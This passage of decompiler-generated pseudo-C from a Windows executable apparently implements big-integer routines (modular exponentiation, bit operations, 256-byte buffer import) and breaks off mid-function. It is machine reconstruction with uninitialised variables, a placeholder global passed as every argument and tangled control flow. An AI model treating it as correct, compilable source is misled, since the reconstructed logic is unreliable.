    int32_t v4 = (result < 0 ? -result : result) - v3; // 0x403187
    int32_t v5; // 0x403150
    if (v4 >= 0 != v4 != 0) {
        // 0x4031ee
        v5 = 0;
        *(int32_t *)(v2 + 4) = result >= 0 ? v5 : -v5;
        return result;
    }
    int32_t v6 = a1 & 31; // 0x403184
    int32_t v7; // 0x403150
    if (v4 > v6) {
        // 0x403198
        v7 = function_4028e0();
    } else {
        // 0x4031a8
        v7 = *(int32_t *)(v2 + 8);
    }
    // 0x4031ab
    if (v6 != 0) {
        // 0x4031bb
        function_401d90(v4, v6);
        int32_t result2 = *(int32_t *)(4 * v4 - 4 + v7) == 0; // 0x4031cd
        // 0x4031ee
        v5 = v4 - result2;
        *(int32_t *)(v2 + 4) = result >= 0 ? v5 : -v5;
        return result2;
    }
    int32_t result3 = *(int32_t *)(v1 + 8); // 0x4031b1
    if (v4 < 1) {
        // 0x4031ee
        v5 = v4;
        *(int32_t *)(v2 + 4) = result >= 0 ? v5 : -v5;
        return result3;
    }
    int32_t v8 = v4; // 0x4031dc
    int32_t v9 = v7; // 0x4031dc
    int32_t result4 = *(int32_t *)(4 * v3 - v7 + result3 + v9); // 0x4031e0
    *(int32_t *)v9 = result4;
    v8--;
    v9 += 4;
    while (v8 != 0) {
        // 0x4031e0
        result4 = *(int32_t *)(4 * v3 - v7 + result3 + v9);
        *(int32_t *)v9 = result4;
        v8--;
        v9 += 4;
    }
    // 0x4031ee
    v5 = v4;
    *(int32_t *)(v2 + 4) = result >= 0 ? v5 : -v5;
    return result4;
}

// Address range: 0x403210 - 0x403bbd
int32_t function_403210(int32_t a1, int32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x403228
    int32_t v2 = *v1; // 0x403228
    int32_t v3; // 0x403210
    int32_t v4; // 0x403210
    if (v2 == 0) {
        if (v4 != a2) {
            // 0x403239
            function_402930();
        }
        int32_t * v5 = (int32_t *)(v4 + 4); // 0x403240
        int32_t v6 = *v5; // 0x403240
        int32_t result = v6 < 0 ? -v6 : v6; // 0x403246
        *v5 = result;
        if (v3 == 0) {
            // 0x403bb6
            return result;
        }
        // 0x403253
        *(int32_t *)(v3 + 4) = 0;
        return result;
    }
    // 0x403261
    if (*(int32_t *)(a2 + 4) == 0) {
        if (v4 != a1) {
            // 0x40327a
            function_402930();
        }
        int32_t * v7 = (int32_t *)(v4 + 4); // 0x403281
        int32_t v8 = *v7; // 0x403281
        int32_t result2 = v8 < 0 ? -v8 : v8; // 0x403287
        *v7 = result2;
        if (v3 == 0) {
            // 0x403bb6
            return result2;
        }
        int32_t v9 = (int32_t)(v2 >= 0) - (int32_t)(v2 < 0); // 0x403274
        if (v9 < 0) {
            int32_t result3 = *(int32_t *)(v3 + 8); // 0x4032ad
            *(int32_t *)(v3 + 4) = -1;
            *(int32_t *)result3 = -v9;
            return result3;
        }
        // 0x403298
        if (v9 == 0) {
            // 0x403253
            *(int32_t *)(v3 + 4) = 0;
            return result2;
        }
        int32_t result4 = *(int32_t *)(v3 + 8); // 0x40329a
        *(int32_t *)(v3 + 4) = 1;
        *(int32_t *)result4 = v9;
        return result4;
    }
    int32_t v10 = 1; // bp-88, 0x4032cc
    int32_t * v11 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x4032e3
    int32_t v12 = 1; // bp-76, 0x4032ec
    int32_t * v13 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x4032fd
    int32_t * v14 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x403315
    int32_t v15 = 1; // bp-100, 0x403323
    int32_t * v16 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x403333
    int32_t * v17 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x40334f
    int32_t v18 = 1; // bp-112, 0x403358
    int32_t * hHeap = GetProcessHeap(); // 0x403362
    int32_t v19 = (int32_t)hHeap; // bp-200, 0x403368
    int32_t * v20 = HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x403369
    if ((int32_t)&v10 != a1) {
        // 0x403378
        function_402930();
    }
    int32_t v21 = (int32_t)v11; // 0x4032e3
    int32_t v22 = *v11; // 0x403390
    int32_t v23 = 0; // 0x403394
    int32_t v24 = 0; // 0x403394
    int32_t v25 = v22; // 0x403394
    int32_t v26; // 0x403210
    if (v22 != 0) {
      lab_0x4033a6:;
        int32_t v27 = v25;
        int32_t v28 = v27 & -v27; // 0x4033aa
        int32_t v29 = v28; // 0x4033b3
        int32_t v30 = 0; // 0x4033b3
        if (v28 < 0x1000000) {
            int32_t v31 = v28;
            int32_t v32 = 256 * v31; // 0x4033b5
            int32_t v33 = 8; // 0x4033b8
            int32_t v34 = v33; // 0x4033c0
            v29 = v32;
            v30 = v33;
            while ((v31 & 0xff0000) == 0) {
                // 0x4033b5
                v31 = v32;
                v32 = 256 * v31;
                v33 = v34 + 8;
                v34 = v33;
                v29 = v32;
                v30 = v33;
            }
        }
        int32_t v35 = v30; // 0x4033c4
        if (v29 >= 0) {
            int32_t v36 = v30 + 1; // 0x4033c6
            int32_t v37 = 2 * v29; // 0x4033c7
            int32_t v38 = v37; // 0x4033c9
            int32_t v39 = v36; // 0x4033c9
            v35 = v36;
            while (v37 >= 0) {
                // 0x4033c6
                v36 = v39 + 1;
                v37 = 2 * v38;
                v38 = v37;
                v39 = v36;
                v35 = v36;
            }
        }
        // 0x4033cb
        v26 = (32 * v24 | 31) - v35;
    } else {
        v23++;
        v26 = -1;
        while (v23 != 0) {
            int32_t v40 = *(int32_t *)(4 * v23 + v21); // 0x40339f
            v24 = v23;
            v25 = v40;
            if (v40 != 0) {
                goto lab_0x4033a6;
            }
            v23++;
            v26 = -1;
        }
    }
    uint32_t v41 = v26;
    function_403150(v41);
    int32_t v42 = &v12; // 0x4033e5
    if (v42 != a2) {
        // 0x4033ef
        function_402930();
    }
    int32_t v43 = (int32_t)v13; // 0x4032fd
    int32_t v44 = *v13; // 0x403407
    int32_t v45 = 0; // 0x40340b
    int32_t v46 = v44; // 0x40340b
    int32_t v47 = 31; // 0x40340b
    int32_t v48; // 0x403210
    if (v44 != 0) {
        goto lab_0x403420_2;
    } else {
        v45++;
        v48 = -1;
        while (v45 != 0) {
            // 0x403419
            v46 = *(int32_t *)(4 * v45 + v43);
            if (v46 != 0) {
                // 0x403420
                v47 = 32 * v45 | 31;
                goto lab_0x403420_2;
            }
            v45++;
            v48 = -1;
        }
        goto lab_0x40344e;
    }
  lab_0x403420_2:;
    int32_t v49 = v46;
    int32_t v50 = v49 & -v49; // 0x403424
    int32_t v51 = v50; // 0x40342d
    int32_t v52 = 0; // 0x40342d
    if (v50 < 0x1000000) {
        int32_t v53 = v50;
        int32_t v54 = 256 * v53; // 0x403430
        int32_t v55 = 8; // 0x403433
        int32_t v56 = v55; // 0x40343b
        v51 = v54;
        v52 = v55;
        while ((v53 & 0xff0000) == 0) {
            // 0x403430
            v53 = v54;
            v54 = 256 * v53;
            v55 = v56 + 8;
            v56 = v55;
            v51 = v54;
            v52 = v55;
        }
    }
    int32_t v57 = v52; // 0x40343f
    if (v51 >= 0) {
        int32_t v58 = v52 + 1; // 0x403441
        int32_t v59 = 2 * v51; // 0x403442
        int32_t v60 = v59; // 0x403444
        int32_t v61 = v58; // 0x403444
        v57 = v58;
        while (v59 >= 0) {
            // 0x403441
            v58 = v61 + 1;
            v59 = 2 * v60;
            v60 = v59;
            v61 = v58;
            v57 = v58;
        }
    }
    // 0x403446
    v48 = v47 - v57;
    goto lab_0x40344e;
  lab_0x40344e:;
    uint32_t v62 = v48;
    function_403150(v62);
    if (function_404030() == 0) {
        // 0x4034c5
        function_4040a0();
    }
    int32_t v63 = v41 < v62 ? v41 : v62; // 0x403467
    int32_t v64 = v41 - v63; // 0x40346a
    function_402ef0(&v10, &v12);
    function_402dd0(v64);
    if (function_404030() == 0) {
        // 0x403507
        function_4040a0();
    }
    int32_t v65 = &v19; // 0x4034f6
    int32_t v66 = v64 + v62 - v63; // 0x40351a
    int32_t * v67 = (int32_t *)(v65 - 4); // 0x40388a
    *v67 = v63;
    function_402dd0((int32_t)&g266);
    int32_t * v68 = (int32_t *)(v65 - 8); // 0x40389d
    *v68 = v42;
    int32_t * v69 = (int32_t *)(v65 - 12); // 0x40389e
    *v69 = a2;
    function_402ef0(NULL, &g266);
    int32_t v70 = &v15; // 0x4038c3
    *v67 = v70;
    *v68 = v42;
    *v69 = a1;
    function_402ef0(NULL, &g266);
    if (v66 != 0) {
        int32_t v71 = v66 - 1; // 0x4038fa
        int32_t v72 = v71; // 0x403a29
        while (v71 != 0) {
            // 0x403a21
            v71 = v72 - 1;
            v72 = v71;
        }
    }
    int32_t v73 = (int32_t)v14; // 0x403315
    int32_t v74 = (int32_t)v16; // 0x403333
    *v67 = v70;
    int32_t v75 = function_4029c0((int32_t)&g266); // 0x403a3f
    int32_t v76 = v75 < 0 ? -v75 : v75; // 0x403a6b
    int32_t v77 = 1; // 0x403a7e
    int32_t v78 = v73; // 0x403a7e
    int32_t v79 = v74; // 0x403a7e
    int32_t v80 = 0; // 0x403a7e
    if (v76 != 0) {
        int32_t v81 = -v76; // 0x403a82
        v77 = 1;
        v78 = v73;
        v79 = v74;
        v80 = 0;
        if (v81 < 0 == (v76 & v81) < 0) {
            // 0x403ae7
            *v67 = (int32_t)&v18;
            function_402af0(v15);
            v77 = v15;
            v78 = v74;
            v79 = v73;
            v80 = v75;
        }
    }
    int32_t v82 = v80;
    *(int32_t *)(v4 + 4) = 0;
    *(int32_t *)v4 = v12;
    int32_t * v83 = (int32_t *)(v4 + 8); // 0x403b2f
    *v83 = v43;
    int32_t v84 = v78; // 0x403b40
    if (v3 != 0) {
        // 0x403b42
        *(int32_t *)(v3 + 4) = *v1 >= 0 ? v82 : -v82;
        int32_t * v85 = (int32_t *)(v3 + 8); // 0x403b48
        *(int32_t *)v3 = v77;
        *v85 = v78;
        v84 = *v85;
    }
    // 0x403b70
    *v67 = v21;
    *v68 = 0;
    *v69 = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 16) = *v83;
    *(int32_t *)(v65 - 20) = 0;
    *(int32_t *)(v65 - 24) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 28) = v84;
    *(int32_t *)(v65 - 32) = 0;
    *(int32_t *)(v65 - 36) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 40) = v79;
    *(int32_t *)(v65 - 44) = 0;
    *(int32_t *)(v65 - 48) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 52) = (int32_t)v17;
    *(int32_t *)(v65 - 56) = 0;
    *(int32_t *)(v65 - 60) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 64) = (int32_t)v20;
    *(int32_t *)(v65 - 68) = 0;
    *(int32_t *)(v65 - 72) = (int32_t)GetProcessHeap();
    // 0x403bb6
    return HeapFree(&g266, (int32_t)&g266, &g266);
}

// Address range: 0x403bc0 - 0x403d0f
int32_t function_403bc0(int32_t a1) {
    // 0x403bc0
    int32_t v1; // 0x403bc0
    if (*(int32_t *)(v1 + 4) == 0) {
        // 0x403d06
        return 0;
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x403be0
    uint32_t v3 = v2 < 0 ? -v2 : v2; // 0x403be6
    if (v3 <= 1) {
        int32_t v4 = 0; // 0x403bec
        if (v3 == 1) {
            // 0x403bee
            v4 = *(int32_t *)*(int32_t *)(a1 + 8);
        }
        uint32_t v5 = v4;
        if (v5 > 1 <= (v5 == 0)) {
            // 0x403d06
            return 0;
        }
    }
    // 0x403c0e
    HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266);
    HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266);
    function_403210(1, v1, a1);
    HeapFree(GetProcessHeap(), (int32_t)&g266, &g266);
    HeapFree(GetProcessHeap(), (int32_t)&g266, &g266);
    return 0;
}

// Address range: 0x403d10 - 0x40402b
int32_t function_403d10(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x403d27
    int32_t v2 = *v1; // 0x403d27
    int32_t v3 = v2 < 0 ? -v2 : v2; // 0x403d34
    int32_t v4; // 0x403d10
    if (v3 == 0) {
        // 0x403d44
        *(int32_t *)(v4 + 4) = 1;
        int32_t result = *(int32_t *)(v4 + 8); // 0x403d4e
        *(int32_t *)result = 1;
        return result;
    }
    int32_t v5 = *(int32_t *)(a2 + 4); // 0x403d2f
    int32_t v6 = v5 < 0 ? -v5 : v5; // 0x403d3e
    function_402050(v6);
    int32_t v7; // bp-68, 0x403d10
    int32_t v8 = v7; // 0x403d6f
    int32_t v9 = *(int32_t *)(a2 + 8); // 0x403d80
    int32_t v10; // bp-84, 0x403d10
    int32_t * v11 = &v10; // 0x403d80
    if (v8 != 0) {
        // 0x403d82
        v7 = 0;
        int32_t * hHeap = GetProcessHeap(); // 0x403d91
        int32_t v12 = (int32_t)hHeap; // bp-96, 0x403d93
        v9 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266);
        function_401d10(v6, v8);
        v11 = &v12;
    }
    int32_t v13 = (int32_t)v11;
    *(int32_t *)(v13 - 4) = 4;
    int32_t v14 = 1; // bp-40, 0x403dbd
    *(int32_t *)(v13 - 8) = 8;
    *(int32_t *)(v13 - 12) = (int32_t)GetProcessHeap();
    int32_t v15 = (int32_t)HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x403dcc
    int32_t v16 = &v14; // 0x403ddb
    int32_t * v17; // 0x403d10
    if (*v1 > -1) {
        int32_t v18; // 0x403d10
        if (v18 != v16) {
            // 0x403df6
            function_402930();
        }
        int32_t v19 = 0; // 0x403e11
        if (v6 <= 0) {
            // 0x403e13
            *(int32_t *)(v13 - 16) = (int32_t)&v7;
            *(int32_t *)(v13 - 20) = v6;
            *(int32_t *)(v13 - 24) = v9;
            *(int32_t *)(v13 - 28) = 0;
            function_402830((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v19 = v6;
        }
        // 0x403e2a
        if (*(int32_t *)(v18 + 4) >= 0) {
            // 0x403e2a
            v17 = (int32_t *)(v13 - 16);
        } else {
            int32_t v20 = v15; // 0x403e33
            if (v6 > v14) {
                // 0x403e35
                v20 = function_4028e0();
            }
            int32_t * v21 = (int32_t *)(v13 - 16);
            *v21 = v19;
            *(int32_t *)(v13 - 20) = v20;
            *(int32_t *)(v13 - 24) = v6;
            function_4019f0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v17 = v21;
            if (v6 >= 1) {
                int32_t v22 = 4 * v6 - 4 + v15; // 0x403e6a
                int32_t v23 = v6; // 0x403e6a
                v17 = v21;
                while (*(int32_t *)v22 == 0) {
                    // 0x403e75
                    v23--;
                    v22 -= 4;
                    v17 = v21;
                    if (v23 >= 0 != v23 != 0) {
                        // break -> 0x403e80
                        break;
                    }
                    v17 = v21;
                }
            }
        }
    } else {
        int32_t * v24 = (int32_t *)(v13 - 16);
        *v24 = a2;
        function_403bc0(v15);
        v17 = v24;
    }
    // 0x403e80
    *v17 = 4;
    *(int32_t *)(v13 - 20) = 8;
    int32_t v25 = 1; // bp-52, 0x403e84
    int32_t * v26 = GetProcessHeap(); // 0x403e8b
    int32_t v27 = v13 - 24; // 0x403e91
    *(int32_t *)v27 = (int32_t)v26;
    int32_t * v28 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x403e92
    int32_t v29 = (int32_t)v28; // 0x403e92
    *v28 = 1;
    int32_t v30 = v27; // 0x403eac
    int32_t v31 = 1; // 0x403eac
    int32_t v32; // 0x403d10
    int32_t v33; // 0x403d10
    int32_t v34; // 0x403d10
    int32_t v35; // 0x403d10
    int32_t v36; // 0x403d10
    uint32_t v37; // 0x403d10
    int32_t v38; // 0x403d10
    int32_t v39; // 0x403d10
    int32_t v40; // 0x403d10
    if (v3 >= 1) {
        int32_t v41 = &v7;
        int32_t v42 = 1; // 0x403d10
        int32_t v43 = v3; // 0x403eb5
        int32_t v44 = v27; // 0x403d10
        while (true) {
            // 0x403eb2
            v43--;
            v38 = v42;
            v36 = -0x80000000;
            v34 = v44;
            while (true) {
              lab_0x403ed3:;
                int32_t v45 = v34;
                v37 = v36;
                int32_t v46 = v38;
                int32_t * v47 = (int32_t *)(v45 - 4); // 0x403ed6
                *v47 = (int32_t)&v25;
                function_402ce0(v37);
                if ((v37 & *(int32_t *)(*(int32_t *)(a1 + 8) + 4 * v43)) != 0) {
                    // 0x403ee8
                    *v47 = v16;
                    function_402ce0((int32_t)&g266);
                }
                // 0x403ef9
                v39 = v46;
                v32 = v45;
                if (v46 > v6) {
                    if (v6 != 1) {
                        if (v6 != 2) {
                            int32_t v48 = v7; // 0x403f37
                            int32_t v49; // 0x403d10
                            int32_t * v50; // 0x403d10
                            int32_t v51; // 0x403d10
                            if (v48 == 0) {
                                int32_t v52 = v45 - 8; // 0x403f57
                                v50 = (int32_t *)v52;
                                v49 = v52;
                                v51 = 0;
                            } else {
                                // 0x403f3e
                                *v47 = v48;
                                int32_t v53 = v45 - 8;
                                int32_t * v54 = (int32_t *)v53;
                                *v54 = v46;
                                int32_t v55 = function_401d10((int32_t)&g266, (int32_t)&g266); // 0x403f44
                                v50 = v54;
                                v49 = v53;
                                v51 = v55;
                            }
                            int32_t v56 = v49;
                            int32_t * v57 = v50;
                            *v57 = v6;
                            *(int32_t *)(v45 - 12) = v9;
                            *(int32_t *)(v45 - 16) = v51;
                            *(int32_t *)(v45 - 20) = v46;
                            function_4025a0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                            int32_t v58 = v7; // 0x403f62
                            v35 = v45;
                            if (v58 == 0) {
                                goto lab_0x403f7a;
                            } else {
                                // 0x403f6c
                                *v47 = v58;
                                *v57 = v6;
                                function_401d90((int32_t)&g266, (int32_t)&g266);
                                // 0x403f77
                                v35 = v56 + 8;
                                goto lab_0x403f7a;
                            }
                        } else {
                            // 0x403f23
                            *v47 = v41;
                            *(int32_t *)(v45 - 8) = v46;
                            *(int32_t *)(v45 - 12) = v29;
                            function_402350((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                            v35 = v45;
                            goto lab_0x403f7a;
                        }
                    } else {
                        // 0x403f0c
                        *v47 = v41;
                        int32_t v59 = v45 - 8; // 0x403f12
                        *(int32_t *)v59 = v46;
                        *v28 = function_402150((int32_t)&g266, (int32_t)&g266);
                        // 0x403f77
                        v35 = v59 + 8;
                        goto lab_0x403f7a;
                    }
                } else {
                    goto lab_0x403f96;
                }
            }
          lab_0x403f9f:
            // 0x403f9f
            v42 = v40;
            v44 = v33;
            v30 = v33;
            v31 = v40;
            if (v43 >= 0 != v43 != 0) {
                // break -> 0x403faa
                break;
            }
        }
    }
    int32_t v60 = v31; // 0x403fac
    if (v31 >= v6) {
        // 0x403fae
        v7 = v8;
        *(int32_t *)(v30 - 4) = (int32_t)&v7;
        *(int32_t *)(v30 - 8) = v6;
        *(int32_t *)(v30 - 12) = v9;
        *(int32_t *)(v30 - 16) = v31;
        function_402830(v7, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v60 = v6;
        if (v6 >= 1) {
            int32_t v61 = v29 - 4 + 4 * v6; // 0x403fd2
            int32_t v62 = v6; // 0x403fd2
            v60 = v62;
            while (*(int32_t *)v61 == 0) {
                // 0x403fda
                v62--;
                v61 -= 4;
                v60 = v62;
                if (v62 >= 0 != v62 != 0) {
                    // break -> 0x403fe2
                    break;
                }
                v60 = v62;
            }
        }
    }
    int32_t v63 = v30; // 0x403fed
    if (v9 != 0) {
        // 0x403fef
        *(int32_t *)(v30 - 4) = v9;
        *(int32_t *)(v30 - 8) = 0;
        int32_t * v64 = GetProcessHeap(); // 0x403ff2
        v63 = v30 - 12;
        *(int32_t *)v63 = (int32_t)v64;
        HeapFree(&g266, (int32_t)&g266, &g266);
    }
    // 0x403ffb
    *(int32_t *)v4 = v25;
    int32_t * v65 = (int32_t *)(v4 + 8); // 0x404003
    *(int32_t *)(v63 - 4) = *v65;
    *(int32_t *)(v4 + 4) = v60;
    *(int32_t *)(v63 - 8) = 0;
    *v65 = v29;
    *(int32_t *)(v63 - 12) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v63 - 16) = v15;
    *(int32_t *)(v63 - 20) = 0;
    *(int32_t *)(v63 - 24) = (int32_t)GetProcessHeap();
    return HeapFree(&g266, (int32_t)&g266, &g266);
  lab_0x403f96:
    // 0x403f96
    v33 = v32;
    v40 = v39;
    v38 = v40;
    v36 = v37 / 2;
    v34 = v33;
    if (v37 < 2) {
        // break -> 0x403f9f
        goto lab_0x403f9f;
    }
    goto lab_0x403ed3;
  lab_0x403f7a:;
    int32_t v66 = v35;
    v39 = v6;
    v32 = v66;
    if (v6 >= 1) {
        int32_t v67 = v6;
        int32_t v68 = v29 - 4 + 4 * v6; // 0x403d10
        v39 = v67;
        v32 = v66;
        while (*(int32_t *)v68 == 0) {
            int32_t v69 = v67 - 1; // 0x403f8b
            v68 -= 4;
            int32_t v70 = v69; // 0x403f91
            v39 = v69;
            v32 = v66;
            if (v69 >= 0 != v69 != 0) {
                // break -> 0x403f96
                break;
            }
            v67 = v70;
            v39 = v67;
            v32 = v66;
        }
    }
    goto lab_0x403f96;
}

// Address range: 0x404030 - 0x40409c
int32_t function_404030(void) {
    // 0x404030
    int32_t v1; // 0x404030
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x404033
    uint32_t v3; // 0x404030
    uint32_t v4 = v3 / 32; // 0x40403f
    if (v4 >= (v2 < 0 ? -v2 : v2)) {
        // 0x404048
        return v2 < 0;
    }
    uint32_t v5 = v3 & 31; // 0x404054
    int32_t v6 = *(int32_t *)(v1 + 8) + 4 * v4; // 0x404057
    uint32_t v7 = *(int32_t *)v6; // 0x404057
    int32_t result = v7 >> v5 & 1; // 0x404061
    if (v2 >= 0) {
        // 0x40408d
        return result;
    }
    if (v5 != 0) {
        if (v7 << (-v3 & 31) != 0) {
            // 0x40408d
            return result ^ 1;
        }
    }
    int32_t v8 = v6; // 0x40407d
    if (v3 < 32) {
        // 0x40408d
        return result;
    }
    int32_t v9 = v4; // 0x40407d
    v8 -= 4;
    while (*(int32_t *)v8 == 0) {
        // 0x404089
        v9--;
        if (v9 >= 0 != v9 != 0) {
            // 0x40408d
            return result;
        }
        v8 -= 4;
    }
    // 0x40408d
    return result ^ 1;
}

// Address range: 0x4040a0 - 0x4041a2
int32_t function_4040a0(void) {
    // 0x4040a0
    int32_t v1; // 0x4040a0
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x4040ad
    int32_t v3 = *v2; // 0x4040ad
    int32_t v4 = v3 < 0 ? -v3 : v3; // 0x4040b8
    int32_t * v5 = (int32_t *)(v1 + 8); // 0x4040ba
    uint32_t v6; // 0x4040a0
    int32_t v7 = v6 / 32; // 0x4040c5
    int32_t v8 = 1 << (v6 & 31);
    int32_t v9; // 0x4040a0
    int32_t result; // 0x404196
    if (v7 >= v4) {
        int32_t v10 = v7 + 1; // 0x4040d9
        int32_t v11 = v10 > 1 ? v10 : 1; // 0x4040e8
        int32_t * v12 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x4040fc
        int32_t v13 = (int32_t)v12; // 0x4040fc
        *v5 = v13;
        int32_t v14 = *v2; // 0x40410b
        *(int32_t *)v1 = v11;
        if ((v14 < 0 ? -v14 : v14) > v11) {
            // 0x404119
            *v2 = 0;
        }
        // 0x404129
        *(int32_t *)(4 * v7 + v13) = v8;
        if (v4 < v7) {
            // 0x404130
            __asm_rep_stosd_memset((char *)(4 * v4 + v13), 0, v7 - v4);
        }
        // 0x40418d
        v9 = v10;
        result = *v2 >= 0 ? v9 : -v9;
        *v2 = result;
        return result;
    }
    int32_t v15 = *v5 + 4 * v7; // 0x40414f
    int32_t v16 = 0; // 0x40414f
    uint32_t v17 = v8;
    int32_t * v18 = (int32_t *)v15; // 0x404150
    uint32_t v19 = *v18 + v17; // 0x404155
    *v18 = v19;
    v16++;
    int32_t v20 = v19 < v17;
    v15 += 4;
    while (v16 < v4 - v7) {
        // 0x404150
        v17 = v20;
        v18 = (int32_t *)v15;
        v19 = *v18 + v17;
        *v18 = v19;
        v16++;
        v20 = v19 < v17;
        v15 += 4;
    }
    // 0x404168
    if (v19 >= v17) {
        // 0x40418d
        v9 = v4;
        result = *v2 >= 0 ? v9 : -v9;
        *v2 = result;
        return result;
    }
    int32_t v21; // 0x4040a0
    if (v4 == 0x7fffffff) {
        // 0x404187
        v21 = *v5;
    } else {
        // 0x404179
        v21 = function_4028e0();
    }
    // 0x40418a
    *(int32_t *)(v21 + 4 * v4) = v20;
    // 0x40418d
    v9 = v4 + 1;
    result = *v2 >= 0 ? v9 : -v9;
    *v2 = result;
    return result;
}

// Address range: 0x4041b0 - 0x404281
int32_t function_4041b0(int32_t a1) {
    // 0x4041b0
    uint32_t v1; // 0x4041b0
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x4041d1
    int32_t v3 = *v2; // 0x4041d7
    if (v1 <= 63) {
        int32_t * v4 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x4041e8
        int32_t v5 = (int32_t)v4; // 0x4041e8
        *(int32_t *)v1 = 64;
        int32_t * v6 = (int32_t *)(v1 + 4); // 0x4041f6
        int32_t v7 = *v6; // 0x4041f6
        *v2 = v5;
        v3 = v5;
        if ((v7 < 0 ? -v7 : v7) >= 65) {
            // 0x404209
            *v6 = 0;
            v3 = v5;
        }
    }
    int32_t v8 = 256; // 0x404216
    int32_t v9 = a1 + 255; // 0x404216
    int32_t v10 = 0;
    int32_t v11 = 0;
    int32_t v12 = (int32_t)*(char *)v9 << (8 * v10 & 24); // 0x404230
    int32_t v13 = v11; // 0x404235
    int32_t v14 = v12; // 0x404235
    int32_t v15 = v10 + 1; // 0x404235
    if (v10 == 3) {
        // 0x404237
        *(int32_t *)(4 * v11 + v3) = v12;
        v13 = v11 + 1;
        v14 = 0;
        v15 = 0;
    }
    int32_t v16 = v14;
    int32_t result2 = v13;
    v8--;
    v9--;
    while (v8 != 0) {
        // 0x404220
        v10 = v15;
        v11 = result2;
        v12 = (int32_t)*(char *)v9 << (8 * v10 & 24) | v16;
        v13 = v11;
        v14 = v12;
        v15 = v10 + 1;
        if (v10 == 3) {
            // 0x404237
            *(int32_t *)(4 * v11 + v3) = v12;
            v13 = v11 + 1;
            v14 = 0;
            v15 = 0;
        }
        // 0x40423f
        v16 = v14;
        result2 = v13;
        v8--;
        v9--;
    }
    if (v16 != 0) {
        // 0x40424c
        *(int32_t *)(4 * result2 + v3) = v16;
        int32_t result = result2 + 1; // 0x40424f
        *(int32_t *)(v1 + 4) = result;
        return result;
    }
    // 0x40425d
    if (result2 < 1) {
        // 0x404274
        *(int32_t *)(v1 + 4) = result2;
        return result2;
    }
    int32_t v17 = result2; // 0x404264
    int32_t v18 = 4 * result2 + v3; // 0x404264
    v18 -= 4;
    int32_t result3 = v17; // 0x40426a
    while (*(int32_t *)v18 == 0) {
        // 0x40426c
        v17--;
        result3 = v17;
        if (v17 >= 0 != v17 != 0) {
            // break -> 0x404274
            break;
        }
        v18 -= 4;
        result3 = v17;
    }
    // 0x404274
    *(int32_t *)(v1 + 4) = result3;
    return result3;
}

// Address range: 0x404290 - 0x40433d
int32_t function_404290(int32_t a1) {
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x40429f
    if (v1 == 0) {
        // 0x404323
        int32_t result; // 0x404290
        return result;
    }
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x4042ae
    int32_t v3 = v1 < 0 ? -v1 : v1; // 0x4042b1
    int32_t v4 = 4 * v3 - 4;
    uint32_t v5 = *(int32_t *)(*v2 + v4);
    int32_t v6 = 0;
    int32_t v7 = v5 / 256; // 0x4042c0
    int32_t v8 = v6 + 1; // 0x4042c3
    while (v5 >= 256) {
        // 0x4042c0
        v5 = v7;
        v6 = v8;
        v7 = v5 / 256;
        v8 = v6 + 1;
    }
    int32_t result2; // 0x404290
    int32_t v9; // 0x404290
    if (v9 == 0) {
        int32_t * v10 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x4042df
        result2 = (int32_t)v10;
    }
    int32_t v11 = v8 + v4; // 0x4042ce
    if (v11 == 0) {
        // 0x404323
        return result2;
    }
    int32_t v12 = 0; // 0x4042fa
    int32_t v13 = v6 + v4 + result2; // 0x4042fa
    int32_t v14 = v11; // 0x4042fa
    int32_t v15 = 0;
    int32_t v16 = v15; // 0x404302
    int32_t v17 = v12; // 0x404302
    int32_t v18 = v7; // 0x404302
    if (v12 == 0) {
        // 0x404304
        v16 = v15;
        v17 = 4;
        v18 = v7;
        if (v15 < v3) {
            // 0x404308
            v16 = v15 + 1;
            v17 = 4;
            v18 = *(int32_t *)(*v2 + 4 * v15);
        }
    }
    // 0x404317
    *(char *)v13 = (char)v18;
    v14--;
    v12 = v17 - 1;
    v13--;
    while (v14 != 0) {
        int32_t v19 = v18 / 256;
        v15 = v16;
        v16 = v15;
        v17 = v12;
        v18 = v19;
        if (v12 == 0) {
            // 0x404304
            v16 = v15;
            v17 = 4;
            v18 = v19;
            if (v15 < v3) {
                // 0x404308
